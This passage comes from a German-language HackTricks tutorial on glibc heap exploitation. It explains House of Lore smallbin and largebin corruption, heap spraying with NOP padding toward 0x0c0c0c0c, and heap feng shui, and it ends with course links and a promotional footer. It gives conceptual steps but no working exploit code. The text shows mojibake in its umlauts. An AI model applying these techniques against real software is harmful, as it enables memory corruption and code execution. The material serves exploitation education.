Es ist wichtig zu wissen, dass die Gr√∂√üe des neuen Wilderness-Chunks gr√∂√üer sein muss als die Anforderung des letzten malloc(). Das hei√üt, wenn das Wilderness auf \&EIP-8 zeigt, wird die Gr√∂√üe genau im EBP-Feld des Stacks liegen.

**The House of Lore**

**SmallBin-Korruption**

Die freigegebenen Chunks werden je nach ihrer Gr√∂√üe in den Bin eingef√ºgt. Bevor sie eingef√ºgt werden, werden sie jedoch in unsorted bins gespeichert. Ein Chunk wird nicht sofort in seinen Bin eingef√ºgt, sondern bleibt in unsorted bins. Wenn dann ein neuer Chunk reserviert wird und der zuvor freigegebene Chunk passt, wird er zur√ºckgegeben, aber wenn ein gr√∂√üerer Chunk reserviert wird, wird der freigegebene Chunk in den entsprechenden Bin verschoben.

Um den verwundbaren Code zu erreichen, muss die Speicheranforderung gr√∂√üer als av->max\_fast (normalerweise 72) und kleiner als MIN\_LARGE\_SIZE (512) sein.

Wenn im Bin ein Chunk der richtigen Gr√∂√üe vorhanden ist, wird dieser zur√ºckgegeben, nachdem er gel√∂st wurde:

bck = victim->bk; Zeigt auf den vorherigen Chunk, dies ist die einzige Information, die wir √§ndern k√∂nnen.

bin->bk = bck; Der vorletzte Chunk wird zum letzten, wenn bck auf den Stack zeigt, wird dem n√§chsten reservierten Chunk diese Adresse zugewiesen.

bck->fd = bin; Die Liste wird geschlossen, indem sie auf bin zeigt.

Es wird ben√∂tigt:
Reservieren Sie zwei mallocs, so dass das erste nach der Freigabe des zweiten √ºberlaufen werden kann und in seinen Bin eingef√ºgt wird (dh ein gr√∂√üeres malloc als das zweite St√ºck reserviert wird, bevor der √úberlauf erfolgt).

Das vom Angreifer kontrollierte malloc, das an die vom Angreifer gew√§hlte Adresse √ºbergeben wird.

Das Ziel ist, wenn wir einen Heap √ºberlaufen k√∂nnen, der darunter ein bereits freigegebenes St√ºck mit seinem Bin hat, k√∂nnen wir seinen bk-Pointer √§ndern. Wenn wir seinen bk-Pointer √§ndern und dieses St√ºck das erste in der Bin-Liste wird und reserviert wird, wird der Bin get√§uscht und ihm wird gesagt, dass das letzte St√ºck in der Liste (das n√§chste Angebot) an der falschen Adresse liegt, die wir angegeben haben (zum Beispiel auf den Stack oder GOT). Wenn also ein weiteres St√ºck reserviert wird und der Angreifer Berechtigungen daf√ºr hat, wird ihm ein St√ºck an der gew√ºnschten Position gegeben und er kann dort schreiben.

Nachdem das modifizierte St√ºck freigegeben wurde, muss ein gr√∂√üeres St√ºck als das freigegebene reserviert werden, damit das modifizierte St√ºck aus den unsortierten Bins entfernt und in seinen Bin eingef√ºgt wird.

Sobald es in seinem Bin ist, ist es an der Zeit, seinen bk-Pointer durch den √úberlauf zu √§ndern, damit er auf die gew√ºnschte Adresse zeigt.

Der Bin muss warten, bis malloc() oft genug aufgerufen wird, damit der modifizierte Bin erneut verwendet wird und den Bin dazu bringt zu glauben, dass das n√§chste St√ºck an der falschen Adresse liegt. Dann wird das gew√ºnschte St√ºck gegeben.

Um die Schwachstelle so schnell wie m√∂glich auszunutzen, w√§re ideal: Reservierung des anf√§lligen St√ºcks, Reservierung des zu modifizierenden St√ºcks, Freigabe dieses St√ºcks, Reservierung eines gr√∂√üeren St√ºcks als das zu modifizierende, Modifizierung des St√ºcks (Schwachstelle), Reservierung eines St√ºcks derselben Gr√∂√üe wie das verwundbare und Reservierung eines zweiten St√ºcks derselben Gr√∂√üe, das auf die gew√§hlte Adresse zeigt.

Um diesen Angriff zu sch√ºtzen, wird die typische √úberpr√ºfung verwendet, dass das St√ºck "nicht" falsch ist: Es wird √ºberpr√ºft, ob bck->fd auf victim zeigt. Das hei√üt, in unserem Fall, ob der fd-Pointer des falschen St√ºcks, das auf dem Stack zeigt, auf victim zeigt. Um diesen Schutz zu umgehen, m√ºsste der Angreifer auf irgendeine Weise (wahrscheinlich √ºber den Stack) in der Lage sein, die Adresse von victim an der richtigen Stelle zu schreiben. Damit es wie ein echtes St√ºck aussieht.

**Korruption LargeBin**

Die gleichen Anforderungen wie zuvor sind erforderlich und einige mehr, au√üerdem m√ºssen die reservierten St√ºcke gr√∂√üer als 512 sein.

Der Angriff ist wie zuvor, dh der bk-Pointer muss ge√§ndert werden und all diese malloc()-Aufrufe sind erforderlich, aber zus√§tzlich muss die Gr√∂√üe des modifizierten St√ºcks so ge√§ndert werden, dass size - nb < MINSIZE ist.

Zum Beispiel muss die Gr√∂√üe auf 1552 gesetzt werden, damit 1552 - 1544 = 8 < MINSIZE (die Subtraktion kann nicht negativ sein, da ein unsigned Wert verglichen wird).

Au√üerdem wurde ein Patch eingef√ºhrt, um es noch komplizierter zu machen.

**Heap Spraying**

Es besteht im Wesentlichen darin, so viel wie m√∂glich Speicher f√ºr Heaps zu reservieren und diese mit einer Polsterung von Nops gefolgt von einer Shellcode zu f√ºllen. Au√üerdem wird als Polsterung 0x0c verwendet. Es wird versucht, auf die Adresse 0x0c0c0c0c zu springen, und wenn also eine Adresse √ºberschrieben wird, die mit dieser Polsterung aufgerufen wird, wird dorthin gesprungen. Im Wesentlichen besteht die Taktik darin, so viel wie m√∂glich zu reservieren, um zu sehen, ob ein Pointer √ºberschrieben wird, und auf 0x0c0c0c0c zu springen, in der Hoffnung, dass dort Nops vorhanden sind.

**Heap Feng Shui**

Es besteht darin, durch Reservierungen und Freigaben den Speicher so zu strukturieren, dass zwischen freien St√ºcken reservierte St√ºcke verbleiben. Der zu √ºberlaufende Puffer wird in einem dieser St√ºcke platziert.

## Interessante Kurse

* [https://guyinatuxedo.github.io/](https://guyinatuxedo.github.io)
* [https://github.com/RPISEC/MBE](https://github.com/RPISEC/MBE)
* [https://ir0nstone.gitbook.io/notes](https://ir0nstone.gitbook.io/notes)

## **Referenzen**

* [**https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html**](https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html)

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen m√∂chten** oder **HackTricks als PDF herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegramm-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories einreichen.

</details>
